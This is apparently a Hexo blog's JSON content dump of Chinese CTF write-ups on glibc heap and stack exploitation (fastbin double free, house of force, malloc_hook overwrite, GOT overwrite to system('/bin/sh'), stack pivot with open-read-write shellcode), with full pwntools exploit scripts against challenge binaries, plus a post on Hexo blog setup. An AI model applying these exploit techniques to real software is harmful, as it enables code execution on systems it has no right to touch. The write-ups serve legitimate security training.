{"meta":{"title":"Rin","subtitle":"","description":"","author":"Rin777","url":"https://fuurinko.github.io","root":"/"},"pages":[],"posts":[{"title":"Asis CTF 2016 b00ks","slug":"Asis-CTF-2016-b00ks","date":"2022-04-02T01:47:13.521Z","updated":"2022-04-03T11:47:40.471Z","comments":true,"path":"2022/04/02/Asis-CTF-2016-b00ks/","link":"","permalink":"https://fuurinko.github.io/2022/04/02/Asis-CTF-2016-b00ks/","excerpt":"","text":"overview​ ctf-wiki上的例子，之前一直没有做，正好拿来复习offbyone。 ​ 也是非常离奇的保护。 re​ 我依稀记得当时做的时候感觉这道题不是很好逆。 ​ 但是时过境迁，也不一定，毕竟大半年了。","categories":[{"name":"HEAP - Off By One","slug":"HEAP-Off-By-One","permalink":"https://fuurinko.github.io/categories/HEAP-Off-By-One/"}],"tags":[{"name":"offbyone","slug":"offbyone","permalink":"https://fuurinko.github.io/tags/offbyone/"}]},{"title":"fastbin中uaf实现任意地址分配的检测问题","slug":"fastbin中uaf实现任意地址分配的检测问题","date":"2022-04-02T00:37:40.817Z","updated":"2022-04-02T01:22:15.994Z","comments":true,"path":"2022/04/02/fastbin中uaf实现任意地址分配的检测问题/","link":"","permalink":"https://fuurinko.github.io/2022/04/02/fastbin%E4%B8%ADuaf%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%E7%9A%84%E6%A3%80%E6%B5%8B%E9%97%AE%E9%A2%98/","excerpt":"","text":"​ 目前做到的与fastbin有关（包括Tcache），并且存在uaf漏洞，需要通过任意地址分配来实现利用的题大致有两类，一类对于申请的chunk，通过简单或者复杂的结构体管理，在一个note的结构体中通常包括size，content甚至指针等字段，我们可以通过覆盖指针实现任意地址分配。另一类则是相对逻辑比较简单的，并没有为note定义结构体，仅仅使用了类似数组的形式，这样的话覆盖free chunk的fd就比较直观并且简单。 ​ 但是无论哪种题目，当我们已经修改free chunk的fd，想要在指定地址分配chunk的时候，必须满足一些检测，或者说条件，不然就会有奇怪的报错，比如： ​ 这里地址是随便找的栈地址，图一乐图一乐。 ​ 既然是任意地址分配，按道理只要是可写的地址应该都能成功。这里直接研究如何将chunk分配至malloc_hook，也是使用场景较多的一种。 ​ 其实绕过的核心还是在于，目标地址的chunk头域是否存在合法的size。 ​ 比如说ctf-wiki上的Arbitrary Alloc一例，就是寻找malloc hook地址附近是否有符合fastbin大小范围的，可以用做size域的字节。如果有，则找到对应的偏移，申请target addr - offset处的地址就行。 ​ 也就是说，核心思路是构造chunk头的size域，无论是地址附近本身就有这样符合要求的字节，或者是通过输入等人为构造都是可以的。而且只要满足了这个条件，就基本能实现任意地址分配。 ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"NoLeak","slug":"week5-5.1","date":"2022-04-01T13:34:22.000Z","updated":"2022-04-02T01:44:44.400Z","comments":true,"path":"2022/04/01/week5-5.1/","link":"","permalink":"https://fuurinko.github.io/2022/04/01/week5-5.1/","excerpt":"","text":"overview 非常之畸形。 re​ 逻辑比较简单简单，并且没有为chunk定义结构体。漏洞点也很明显，就是还是free后没有给指针置0，顺便edit的时候size没有限定，可以造成堆溢出。 利用​ 没有办法改got表，但是可以写shellcode。所以是不是能uaf改指针，add到栈上写shellcode呢？ ​ 但是问题随即而来，我们有向栈上写shellcode的能力，但是如何控制程序执行？ ​ 由于没有leak的机会，所以我们很难通过单纯向栈内写东西来使得shellcode执行，所以需要借用其他的函数，比如说将让malloc_hook指向shellcode_addr，这样就能执行了。 ​ 但是第一步，我们需要一个任意地址写，来将shellcode写入。 关于任意地址分配的疑思​ 这里我把这道题想得太简单了，我以为这里只用UAF就可以劫持chunk ptr。(因为程序真的写得很简单嘛555) ​ 由于其实还是不太清楚分配fastbin的一些流程，或者说检测，导致我还是天真地相信单纯利用uaf就能够实现任意地址写，但是无情的报错掐碎了我的幻想，之所以报错大概是我少写chunk的size域，导致过不了检测。 ​ 原来这个点wiki上就有啊，还是我刷的题太太太太太少了。 ​ 所以这个题如果想要利用uaf实现任意地址分配，首先选择分配的地址为malloc_hook，然后问题就在于我们无法手工构造fake chunk size域，这样的结果就会导致刚才那个报错，那我们可以尝试寻找malloc_hook附近是否有符合条件的，可以充当size的字节。 寻找malloc_hook​ 但是首先我们需要找到malloc_hook所在的地址。这个题目是没有leak的，所以我们不能通过常规leak main_arena的思路来寻找。回想一下，libc中main_arena与malloc_hook的偏移其实是固定且很小的，也就是malloc_hook = main_arena - 0x10,所以当我们获得一个fastbin时，malloc_hook就是bin_addr-size-0x10-0x10。 ​ ​","categories":[{"name":"HEAP","slug":"HEAP","permalink":"https://fuurinko.github.io/categories/HEAP/"}],"tags":[]},{"title":"Dynamic_Allocator_Misuse","slug":"pwn.college_Dynamic_Allocator_Misuse","date":"2022-04-01T12:34:14.000Z","updated":"2022-04-01T12:31:31.562Z","comments":true,"path":"2022/04/01/pwn.college_Dynamic_Allocator_Misuse/","link":"","permalink":"https://fuurinko.github.io/2022/04/01/pwn.college_Dynamic_Allocator_Misuse/","excerpt":"","text":"Level1​ ​ 开门绿，你从未拥有过的全新体验（ ​ 给出了增删查以及load flag的四个功能，free有uaf，纯纯的uaf啊。 ​ 直接malloc flag_chunk_size，free，然后load flag，flag chunk被load在chunk0内存空间，然后puts就行。 Level1.1​ 故技重施。 Level2.0​ 做法和楼上完全一致，但是程序逻辑其实是不一样的，详见level2.1。 Level2.1​ level2和1的差别就是load flag并不是使用固定的size，而是随机数，在2.0我们可以看到flag chunk的size，但是2.1不行，所以需要想办法绕过。 ​ ​ 一个128 ～ 999的随机数。 ​ 所以绕过的思路也非常之简单，只需要malloc的chunk size大于999+0x8就行。我随便malloc了1200，亲测有效。 ​ Level3.0连续malloc 两个832sizechunk，然后依次free chunk1 和chunk0。再read flag，puts chunk1。 Level3.1​ 一样。 Level4.0​ （这个不会是level3的随机数版吧。。。。 还好，不是） ​ 我才意识到它那个read two times其实会覆盖第一次read的内容，所以puts的话是要write 第二次read的flag。 ​ 回到题本身，多出一个scanf的功能，应该是希望我们修改fd。话说这个是真的不走寻常路，一上来就整tcache。但是也能理解，tcache和fastbin在这种等级上的利用难度其实差不多。 ​ 程序依旧是可以uaf，malloc flag chunk size，free掉，然后edit fd，使其指向flag chunk，下一次malloc就会分配flag chunk的空间。也就是能够将flag puts出来，但是有个问题就是，如果直接输入fd的覆盖的话似乎是没有办法转换成字节流的，我又懒得写脚本，怎么搞呢。能跳过这道题吗。 ​ 能*v* Level5.0​ 感觉前面的level没啥好做的。 ​ 可以add 最多16个chunk，多了一个puts_flag功能，大致就是只要flag ptr指向的地方不为0就能打印flag。但是程序并没有给我们提供覆盖内存的功能。 123456789101112131415161718for ( i = 0; i &lt;= 0; ++i ) &#123; printf(&quot;[*] flag_buffer = malloc(%d)\\n&quot;, 432LL); size_4 = (const char *)malloc(0x1B0uLL); *(_QWORD *)size_4 = 0LL; printf(&quot;[*] flag_buffer = %p\\n&quot;, size_4); &#125; v3 = open(&quot;/flag&quot;, 0); read(v3, (void *)(size_4 + 16), 0x80uLL); puts(&quot;[*] read the flag!&quot;); &#125; if ( strcmp(s1, &quot;puts_flag&quot;) ) break; if ( *(_QWORD *)size_4 ) puts(size_4 + 16); else puts(&quot;Not authorized!&quot;); &#125; ​ flag 是在flag ptr + 16 的地方读入的，但是需要让flag_ptr +不为0， 并没有任何输入的方法的话，只能通过构造chunk的meta datd了。不过其实我不理解，flag已经被load进了idx0，为什么puts出来是空字节…大概是因为flag是在ptr+16的地方读入，前面的字符都是\\x00，所以还是需要覆盖flag ptr首字节为自然数，然后通过puts_flag拿flag。 ​ 但是这个思路感觉行不通，因为每次load flag之后都会把ptr首字节置0，所以有了另外一种思路就是在ptr+16的地方伪造idx。也就是需要使一个idx指向ptr+16。 Level6​ 输入的flag与0x42554b处八个字符相等即可拿flag，但是这个地址处的字符显然需要我们自己覆盖。所以思路是利用uaf构造任意地址写。但是又有scanf。这下不得不写脚本了。 蚌埠住了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import*p = process(&quot;/challenge/babyheap_level6.0&quot;)#p = process(&quot;./babyheap_level6.0&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;target_addr = 0x42554B - 0x10def add(idx,size): p.recvuntil(&quot;:&quot;) p.sendline(b&quot;malloc&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size))def free(idx): p.recvuntil(&quot;:&quot;) p.sendline(&quot;free&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def puts(): p.recvuntil(&quot;:&quot;) p.sendline(&quot;puts&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def edit(idx,content): p.recvuntil(&quot;:&quot;) p.sendline(&quot;scanf&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;\\n&quot;) p.sendline(content)add(0,40)#chunk0free(0)#bin0payload = p64(target_addr)*2edit(0,payload)gdb.attach(p)add(0,40)#point to target_addredit(0,b&#x27;a&#x27;*40)add(1,40)#point to target_addredit(1,b&#x27;a&#x27;*40)p.recvuntil(&quot;:&quot;)p.sendline(b&quot;send_flag&quot;)p.recvuntil(&quot;Secret: &quot;)p.sendline(b&quot;a&quot;*8)p.interactive() Level7​ level6的随机数版，建议别做，折寿。 Level8​ fd的target addt开头是换行符，但是无所谓，直接申请0x426701-0x10就行，下一道。 Level9 ​ 稍微有些意思，ida摸了一圈并没有看出程序是怎么“discard”chunk的。 ​ 明天来做。","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"starctf_2019_quicksort","slug":"week5-4.1","date":"2022-03-31T12:04:14.000Z","updated":"2022-04-01T14:35:31.192Z","comments":true,"path":"2022/03/31/week5-4.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/31/week5-4.1/","excerpt":"","text":"overview​ libc大版本是2.23。 re​ 整体实现了一个简单的快速排序功能，在输入具体需要排序的数的时候存在溢出，但是由于开启了canary，并不是很好利用。并且num的储存其实是在堆上的，所以我以为这是个栈题，这其实是个堆题。 12345678910111213141516171819memset(s, 0, sizeof(s)); num = 0; puts(&quot;how many numbers do you want to sort?&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;num); getchar(); num_ptr = malloc(4 * num);//add num_chunk for ( i = 0; i &lt; num; ++i ) &#123; printf(&quot;the %dth number:&quot;, i + 1); gets(s);// v0 = (int *)((char *)num_ptr + 4 * i); *v0 = atoi(s);//将输入的num储存在num_chunk中 &#125; sorting(num_ptr, 0, num - 1);//不想看有没有洞的排序 puts(&quot;Here is the result:&quot;); for ( j = 0; j &lt; num; ++j ) printf(&quot;%d &quot;, *((_DWORD *)num_ptr + j));//输出结果 puts(&amp;byte_8048AD2);//看不懂有啥用。 free(num_ptr);//意义不大 ​ 随便输点东西，堆上布局是这样。 ​ 可以看到这个gets还是起了大用处的。 ​ 研究了一下，发现这里目前最大的漏洞在于储存输入num个数的变量和控制num chunk的ptr是相邻的，所以可以通过gets 将ptr覆盖成任意数,这样在输入num的时候就能够实现任意地址写。 （之前看瞎眼了，还以为覆盖的只是num的size在栈上的值，以为要通过num的idx来任意地址写，太恐怖了） 利用 需要至少两次malloc，以在print后继续输入payload。因为在这个阶段我们并没有leak任何的真实地址，所以考虑覆盖某个got为main addr。 在leak libc后，假定能够再次输入，需要选择合适的函数来覆盖为system，条件是参数可控。（这里似乎只有free是可能的） ​ 所以第一次执行时，申请两个num，输入第一个num时覆盖num ptr为free got addr，并在payload前四位填写free got addr，输入第二个num时，此时num ptr已经为free got addr，填写main addr覆盖，接着printf leak libc，call main，进行第二次num chunk的申请，同样地将free got 覆盖为system addr。并再次覆盖num ptr为某个可写的地址，输入binsh字符串从而getshell。 ​ 好麻。 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;elf = ELF(&#x27;././starctf_2019_quicksort&#x27;)p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./starctf_2019_quicksort&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)puts_got_addr = elf.got[&#x27;puts&#x27;]free_got_addr = elf.got[&#x27;free&#x27;]gets_got_addr = elf.got[&#x27;gets&#x27;]main_addr = 0x8048816addr = 0x804b000p.recvuntil(&quot;how many numbers do you want to sort?&quot;)p.sendline(b&quot;2&quot;)payload = p32(free_got_addr).ljust(16,b&#x27;a&#x27;)+ p32(2) + p32(1)*2 + p32(free_got_addr)p.recvuntil(&quot;the 1th number:&quot;)#idx 1p.sendline(payload)#overwrite num_ptr with free got addrp.recvuntil(&quot;the 2th number:&quot;)#idx 2p.sendline(p32(main_addr))#modify free_got to main addrp.recvuntil(&quot;Here is the result:&quot;)puts_addr = u32(p.recvuntil(&quot;1&quot;)[:4])#leak libc addrlog.success(&quot;free_addr =&gt; &#123;&#125;&quot;.format(hex(free_addr)))system_addr = free_addr - (libc.symbols[&#x27;free&#x27;] - libc.symbols[&#x27;system&#x27;])log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))p.recvuntil(&quot;how many numbers do you want to sort?&quot;)#ret to main againp.sendline(b&quot;2&quot;)#allocate chunk in free got addrpayload = p32(system_addr).ljust(16,b&#x27;a&#x27;)+ p32(2) + p32(1)*2 +p32(addr)#overwrite freegot with systemp.recvuntil(&quot;the 1th number:&quot;)p.sendline(payload)p.recvuntil(&quot;the 2th number:&quot;)p.sendline(b&quot;/bin/sh;&quot;)p.interactive() ​ ​ ​ ​","categories":[{"name":"HEAP","slug":"HEAP","permalink":"https://fuurinko.github.io/categories/HEAP/"}],"tags":[]},{"title":"gyctf_2020_force","slug":"week5-3.1","date":"2022-03-30T03:21:26.675Z","updated":"2022-03-30T08:08:57.081Z","comments":true,"path":"2022/03/30/week5-3.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/30/week5-3.1/","excerpt":"","text":"overview 好绿。 逆向​ 程序比较简约，只有add和put两个功能。逻辑也不复杂。漏洞的话也比较明显，一个是程序直接把heap base白给了。另一个是虽然询问了size的大小，但是在实际add的时候完全没有根据size分配chunk,并且可以分配很大size的chunk。 ​ ​ 导致我们可以很轻易地修改top chunk的size。 ​ 并且put功能看起来只能打印D93上的东西,也就是一个空字节。 利用修改top chunk size1p.sendafter(&quot;content&quot;,b&#x27;a&#x27;*0x10 + p64(0xffffffffffffffff)*2) ![截屏2022-03-30 下午3.07.21](/Users/rin/Library/Application Support/typora-user-images/截屏2022-03-30 下午3.07.21.png) ​ 但是随之而来的问题就是，除了程序白给的chunk ptr以外，没有任何输出函数，以至于无法leak libc。所以只能从这个免费打印的ptr下手。 ​ 一个trick就是，我们可以add一个巨大的chunk，巨大到需要mmap来分配空间，而mmap分配的内存空间与libc是有固定的偏移的，我们能够轻易地拿到mmap分配的chunk的地址，也就能计算出libc base。 ​ 这里我随意申请了100000000000 size的chunk。 ​ ​ 可以看到，比如我们获得了addr为0x7fe8af273000，那么这个地址与libc基址的偏移就是0x76F000。 ​ 这样就能够leak libc，计算malloc hook的地址了。 123456789#leak libc with mmapp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;size&quot;)p.sendline(&#x27;100000000000&#x27;)chunk_addr = u64(p.recvuntil(&quot;bin addr &quot;)[:8])libc_base = chunk_addr + 0x76F000log.success(&quot;libc_base:&quot; + hex(libc_base))malloc_hook_addr = libc_base + libc.symbols[&quot;__malloc_hook&quot;] ​ 接着就是修改top chunk的指针，这里主要涉及到hof的知识点，需要注意的就是offset的计算。 1234567891011121314151617#leak top chunk addrp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;size&quot;)p.sendline(&#x27;4&#x27;)p.recvuntil(&quot;bin addr &quot;)top_chunk_addr = u64(p.recv(8)) - 0x20log.info(&quot;top_chunk_addr :&quot;.format(hex(top_chunk_addr)))#modify top chunk addrp.sendafter(&quot;content&quot;,b&#x27;a&#x27;*0x10 + p64(0xffffffffffffffff)*2)#modify top chunk ptrfake_size = malloc_hook_addr - top_chunk_addr - 0x10#0x2AAAA27CA9C0add(fake_size,b&#x27;a&#x27;)#modify malloc hook space with onegadgetadd(0x10,p64(libc_base + one_gadget))add(0x10,b&#x27;a&#x27;)p.interactive() ​ ​","categories":[{"name":"HEAP - House Of Force","slug":"HEAP-House-Of-Force","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Force/"}],"tags":[{"name":"hof","slug":"hof","permalink":"https://fuurinko.github.io/tags/hof/"}]},{"title":"9447_CTF-Search Engine","slug":"week5-2.1","date":"2022-03-29T02:44:17.477Z","updated":"2022-03-30T13:51:44.919Z","comments":true,"path":"2022/03/29/week5-2.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/29/week5-2.1/","excerpt":"","text":"overview 逆向menu​ 一共只有两个功能，search word和index sentence。 index sentence​ 指针操作有点多，配合gdb观看效果更佳。 ​ 当只malloc一个10 size的chunk时，内存是这样的，代码是这样的： 123456789101112131415161718puts(&quot;Enter the sentence size:&quot;); v0 = read_num(); sentence_size = (unsigned int)(v0 - 1); size = v0; if ( (unsigned int)sentence_size &gt; 0xFFFD ) error(&quot;Invalid size&quot;); puts(&quot;Enter the sentence:&quot;); sentence_ptr = (char *)malloc(size);//一个content chunk read_word((__int64)sentence_ptr, size, 0); v4 = sentence_ptr + 1; v5 = (__int64)&amp;sentence_ptr[sentence_size + 2]; ptr2 = malloc(0x28uLL);//一个ptr chunk v7 = 0; *(_QWORD *)ptr2 = sentence_ptr; ptr2[2] = 0; *((_QWORD *)ptr2 + 2) = sentence_ptr; ptr2[6] = size; search1234567891011121314151617181920212223242526if ( item ) &#123; do &#123; if ( *(_BYTE *)head-&gt;sentence_ptr ) &#123; if ( head-&gt;size == size &amp;&amp; !memcmp((const void *)head-&gt;content, ptr, size) ) &#123; __printf_chk(1LL, &quot;Found %d: &quot;, (unsigned int)head-&gt;word_size); fwrite((const void *)head-&gt;sentence_ptr, 1uLL, head-&gt;word_size, stdout); putchar(10); puts(&quot;Delete this sentence (y/n)?&quot;); read_word((__int64)v3, 2, 1); if ( v3[0] == &#x27;y&#x27; ) &#123; memset((void *)head-&gt;sentence_ptr, 0, head-&gt;word_size); free((void *)head-&gt;sentence_ptr); puts(&quot;Deleted!&quot;); &#125; &#125; &#125; head = (word *)head-&gt;next; &#125; while ( head ); &#125; free(ptr); 这个功能相当于一个add加一个free，如果search到了word就可以删除chunk。注意一定是word和size完全匹配才能成功搜索： 漏洞点read_str1234567891011121314151617181920212223242526272829303132if ( size &lt;= 0 ) &#123; v4 = 0; &#125; else &#123; v4 = 0; while ( 1 ) &#123; v5 = (_BYTE *)(head + v4); v6 = fread(v5, 1uLL, 1uLL, stdin); // read one byte from stdin to &amp;v5 if ( v6 &lt;= 0 ) break; if ( *v5 == &#x27;\\n&#x27; &amp;&amp; value_0 ) &#123; if ( v4 ) &#123; *v5 = 0; return; &#125; v4 = v6 - 1; if ( size &lt;= v6 - 1 ) break; &#125; else &#123; v4 += v6; if ( size &lt;= v4 ) break; &#125; &#125; &#125; ​ 在读取的时候，if读入的终止判断为if ( *v5 == &#39;\\n&#39; &amp;&amp; value_0 )，value_0为传入的参数，恒为0，因此这个0后面的条件语句就不管用了，直接跳转到else的情况，也就是一直读入size大小的字符为止，所以在执行程序的时候回车无法结束输入，同时输入的字符串在内存中也没有空字节作为结尾。 ​ 既然又是没有空字节，那么又可以考虑内存泄露的问题了。 delete123456if ( v3[0] == &#x27;y&#x27; ) &#123; memset((void *)head-&gt;sentence_ptr, 0, head-&gt;word_size); free((void *)head-&gt;sentence_ptr); puts(&quot;Deleted!&quot;); &#125; ​ 这里在free的时候把head-&gt;sentence_ptr置0了,并且由于对于单词的索引实际上是sentence ptr的引用，所以单词实际上也被置0了，然而指向单词的结构体指针，并没有被置0，因此能继续进行单词的搜索,只不过此刻单词需要搜索的内容为‘\\x00’。 ​ 利用利用unsortedbin leak libc，获取malloc hook12345678910sentence = b&#x27;a&#x27;*0x80 + b&#x27;bbbb bbbb bbbb b&#x27;index_sentence(len(sentence),sentence)#small binsearch_word(1,&quot;b&quot;) delete()gdb.attach(p)search_word(1,&#x27;\\x00&#x27;)p.recvuntil(&#x27;Found&#x27; + str(len(sentence)) + &#x27;: &#x27;)unsorted_bin_addr = u64(p.recv(8))p.recvuntil(&quot;Delete this sentence (y/n)?&quot;)p.sendline(&#x27;n&#x27;) ​ 先让一个small chunk进入unsorted bin，从gdb中我们可以看到其与main_arena的相对偏移，但是我们需要利用漏洞将其leak出来才能够利用。 ​ ​ 因为之前说到，就算delete了sentence，word chunk中的指针并没有被置0，还是能够搜索，所以只需要搜索\\x00，就能输出unsortedbin的地址。 构造double free，将fake chunk分配至malloc hook绕过验证，构造fastbin循环链表​ 虽然单词的指针并没有被置0，但是想要进行搜索还是需要绕过 if ( *(_BYTE *)head-&gt;sentence_ptr )的验证。 ​ 所以可以按照一般构造fastbin double free的思路来处理这里的chunk。 ​ 因为我们想要修改malloc hook，所以至少需要一个fd指向malloc hook的fake chunk和一个内容为one gadget的fake chunk，同时两个chunk都需要被分配在同一个ptr上，所以这里至少要构造出a-&gt;b-&gt;a-&gt;... ​ ​ 所以实现的过程大概是申请三个chunk，再依次删除： 1234567index_sentence(0x60,b&#x27;m&#x27;*0x5f+ b&#x27;a&#x27;)#aindex_sentence(0x60,b&#x27;m&#x27;*0x5f+ b&#x27;a&#x27;)#bindex_sentence(0x60,b&#x27;m&#x27;*0x5f+ b&#x27;a&#x27;)#csearch_word(1,b&#x27;a&#x27;)delete()delete()delete() ​ 这样fastbin链表如下： 1fastbin -&gt; a -&gt;b -&gt;c -&gt; NULL ​ 接着利用漏洞点，搜索空字节，double free b和a 123456search_word(&#x27;\\x00&#x27;)delete()#delete adelete()#delete bp.recvuntil(&quot;Delete this sentence (y/n)?&quot;)p.sendline(&#x27;n&#x27;)#fastbin =&gt;b -&gt;a -&gt; b -&gt; a -&gt; c -&gt; null ​ 这样再申请一个chunk，就能覆盖此刻b chunk的fd，将其修改为malloc hook。 12345678910111213index_sentence(0x60,content)#modify the fd ptrindex_sentence(0x60,b&#x27;a&#x27; * 0x60)#point to malloc hookindex_sentence(0x60,b&#x27;a&#x27; * 0x60)#chunk aone_gadget_addr = libc_base + 0x3f3d6payload = b&#x27;a&#x27; * 0x13 + p64(one_gadget_addr)#add to chunk b space againpayload = payload.ljust(0x60, b&#x27;q&#x27;)index_sentence(payload)p.interactive()","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"ret2shellcode","slug":"ret2shellcode","date":"2022-03-28T14:52:39.514Z","updated":"2022-03-29T02:24:26.313Z","comments":true,"path":"2022/03/28/ret2shellcode/","link":"","permalink":"https://fuurinko.github.io/2022/03/28/ret2shellcode/","excerpt":"","text":"​ 一个写shellcode大合集。 [极客大挑战 2019]Not Bad普通的栈迁移​ 无保护。可以读入程序的字符长度为0x38，读入shellcode的话空间会不够，需要栈迁移。 ​ ​ 程序为我们开辟了一块fake stack，我们可以直接将ebp劫持至0x123000。 ​ 关于栈迁移的部分，其实挺久没有利用到这个trick了，有些不记得了，但是看了相关的文章就又想起来了。这篇写得很详细：PWN！栈迁移原理 12payload = b&#x27;a&#x27;*32 + p64(target_addr) + p64(main_retn)#pivot the stack to target addr ​ 发送这一段payload以后rbp已经劫持到了0x123000。其实就是在第一次控制程序执行流的时候覆盖rbp为对应的地址，然后在跳转时回到了main函数，但跳过了对栈指针有操作的指令。 ​ 123456payload = asm(shellcraft.amd64.read(0,target_addr+0x300,0x300))#read shellcode to target addrpayload += asm(&quot;mov rax,0x123300;call rax&quot;)#执行shellcodepayload = payload.ljust(40,b&#x27;a&#x27;) payload += p64(target_addr)#控制程序执行流p.recvline(&quot;Easy shellcode, have fun!&quot;)p.sendline(payload) 123456shellcode = shellcraft.open(&quot;/flag&quot;) shellcode += shellcraft.read(3, target_addr + 0x100 , 0x50)shellcode += shellcraft.write(1, target_addr + 0x100, 0x50)shellcode = asm(shellcode)p.sendline(shellcode)p.interactive() 一开始shellcode怎么都生成不了，直到加了这个,挺无语的。 1context.arch = &#x27;amd64&#x27; 这个题还有另外一个比较逆天的思路。 逆天的栈迁移直接利用jmp rsp这个gadget，直接跳转到对应的地方执行，程序输入的buf是在rsp-0x30的地方，所以提前在buf布置好代码，然后利用jmp rsp执行。布置的代码就类似上一个比较常规的思路，套一个target addr 的read，然后读orw的shellcode。 12345678910111213141516171819202122232425from pwn import*#from LibcSearcher import LibcSearchercontext.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./bad&quot;)elf = ELF(&quot;./bad&quot;)jmp_rsp = 0x400a01target_addr = 0x123000payload = asm(shellcraft.read(0,target_addr + 0x300,0x300))+ asm(&quot;mov rax,0x123000;call rax&quot;)payload = payload.ljust(40,b&#x27;a&#x27;)payload += p64(jmp_rsp) + asm(&quot;sub 0x30,rsp;jmp rsp&quot;)p.recvline(&quot;Easy shellcode, have fun!&quot;)p.sendline(payload)shellcode = shellcraft.open(&quot;/flag&quot;) shellcode += shellcraft.read(3, target_addr + 0x100 , 0x20)shellcode += shellcraft.write(1, target_addr + 0x100, 0x20)shellcode = asm(shellcode)p.send(shellcode) mrctf2020_shellcode_revengeoverview 看起来像ret2shellcode。 逆向​ 不知道为什么ida不能一键f5，不过也懒得修了，程序逻辑也比较简单，就是一个write和read。然后程序会对输入的字符进行ascii码的大小的比较， ​ ​ 分析一下这个流程图，我们的目的是执行loc_1236，一共有三个箭头指向它，归纳以后分别是(0x60,0x7A),(0x2f,0x5A),ascii在这些范围内的字符会被读入buf，然后call rax，也就是执行了我们输入的shellcode。 利用​ 由于题目本身的设置，我们并不需要像常规那样先泄露什么栈上的地址，只需要绕过题目的检测。虽然但是，搞不懂这个字符ackii码的限制意义何在。去摸了一下ackii表，发现这个范围内的字符都是数字或者字母。 ​ 所以把shellcode转换成这些范围内的字符，然后直接传输就行。 ​","categories":[{"name":"STACK - ret2shellcode","slug":"STACK-ret2shellcode","permalink":"https://fuurinko.github.io/categories/STACK-ret2shellcode/"}],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"hexo调教合集","slug":"hexo调教合集","date":"2022-03-26T04:12:52.291Z","updated":"2022-03-26T13:49:24.836Z","comments":true,"path":"2022/03/26/hexo调教合集/","link":"","permalink":"https://fuurinko.github.io/2022/03/26/hexo%E8%B0%83%E6%95%99%E5%90%88%E9%9B%86/","excerpt":"","text":"​ 如何实现一个好看且满足我所有需求的blog？ 高亮​ 之前我以为是博客主题配置的问题（就是highlight对象的值的问题），但是无论用怎么样的方法都不太行。 ​ 在研究代码高亮的过程中，我才知道原来有个项目叫highlight.js,里面有各种各样的代码高亮的css文件。 ​ 一开始我是将博客原本的代码高亮的css文件替换成我想要的样式，但是无论替换成什么样式，博客中代码都是蓝色，清一色的蓝色。然后我意识到，这根本不是什么代码高亮的样式，这根本就是，没有代码高亮。 ​ 然后我开始在网上寻找解决方案，搜索的关键词是hexo 无法显示代码高亮，辗转来回，找到了一篇文章。 ​ hexo中highlight.js代码高亮的修改方法 ​ 按照文章中的方法，我在主题layout文件夹中的_post.ejs文件随便找了个角落，把 12345678COPY&lt;!-- Highlight.js --&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;//highlightjs.org/static/demo/styles/night-owl.css&quot;&gt;&lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; hljs.initHighlightingOnLoad();&lt;/script 丢了进去。 ​ 然后我的博客就成功的显示了代码高亮。 ​ 高亮的样式可以通过更改sytels/xx来实现，具体的样式可以从Highlight.js官网找到。 音乐播放器​ 步骤其实比较简单。 1:安装插件​ ``` 1npm install --save hexo-tag-aplayer 2:更改配置​ 在hexo主题的config文件中增加 12aplayer: meting: true 3:在正文中添加tag例子 1&#123;% meting &quot;7342554262&quot; &quot;netease&quot; &quot;playlist&quot; &quot;theme:#555&quot; &quot;mutex:true&quot; &quot;listmaxheight:340px&quot; &quot;preload:auto&quot; %&#125; 选项 默认值 描述 id 必须值 歌曲 id / 播放列表 id / 相册 id / 搜索关键字 server 必须值 音乐平台: netease, tencent, kugou, xiami, baidu type 必须值 song, playlist, album, search, artist fixed false 开启固定模式 mini false 开启迷你模式 loop all 列表循环模式：all, one,none order list 列表播放模式： list, random volume 0.7 播放器音量 lrctype 0 歌词格式类型 listfolded false 指定音乐播放列表是否折叠 storagename metingjs LocalStorage 中存储播放器设定的键名 autoplay true 